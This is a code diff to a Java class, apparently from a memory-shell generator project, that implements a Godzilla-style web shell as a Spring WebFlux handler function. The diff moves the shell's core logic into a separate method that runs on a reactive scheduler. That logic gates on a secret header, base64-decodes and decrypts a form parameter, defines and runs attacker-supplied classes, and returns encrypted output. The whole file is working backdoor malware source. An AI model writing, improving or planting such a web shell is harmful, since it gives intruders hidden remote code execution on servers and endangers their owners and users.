@@ -1,9 +1,11 @@
 package com.reajason.javaweb.memshell.shelltool.godzilla;
 
+import org.springframework.util.MultiValueMap;
 import org.springframework.web.reactive.function.server.HandlerFunction;
 import org.springframework.web.reactive.function.server.ServerRequest;
 import org.springframework.web.reactive.function.server.ServerResponse;
 import reactor.core.publisher.Mono;
+import reactor.core.scheduler.Schedulers;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -35,33 +37,36 @@ public class GodzillaHandlerFunction extends ClassLoader implements HandlerFunct
         if (value == null || !value.contains(headerValue)) {
             return Mono.empty();
         }
-        Object bufferStream = request.formData().flatMap(map -> {
-            StringBuilder result = new StringBuilder();
-            try {
-                byte[] data = base64Decode(map.getFirst(pass));
-                data = x(data, false);
-                if (payload == null) {
-                    payload = new GodzillaHandlerFunction(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
-                } else {
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = payload.newInstance();
-                    f.equals(arrOut);
-                    f.equals(data);
-                    f.equals(request);
-                    f.toString();
-                    result.append(md5.substring(0, 16));
-                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
-                    result.append(md5.substring(16));
-                }
-            } catch (Throwable ex) {
-                ex.printStackTrace();
-                result.append(getErrorMessage(ex));
-            }
-            return Mono.just(result.toString());
-        });
+        Mono<String> bufferStream = request.formData()
+                .flatMap(map -> Mono.fromCallable(() -> process(map, request))
+                        .subscribeOn(Schedulers.boundedElastic()));
         return ServerResponse.ok().body(bufferStream, String.class);
     }
 
+    private String process(MultiValueMap<String, String> map, ServerRequest request) {
+        StringBuilder result = new StringBuilder();
+        try {
+            byte[] data = base64Decode(map.getFirst(pass));
+            data = x(data, false);
+            if (payload == null) {
+                payload = new GodzillaHandlerFunction(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
+            } else {
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = payload.newInstance();
+                f.equals(arrOut);
+                f.equals(data);
+                f.equals(request);
+                f.toString();
+                result.append(md5.substring(0, 16));
+                result.append(base64Encode(x(arrOut.toByteArray(), true)));
+                result.append(md5.substring(16));
+            }
+        } catch (Throwable ex) {
+            ex.printStackTrace();
+            result.append(getErrorMessage(ex));
+        }
+        return result.toString();
+    }
 
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
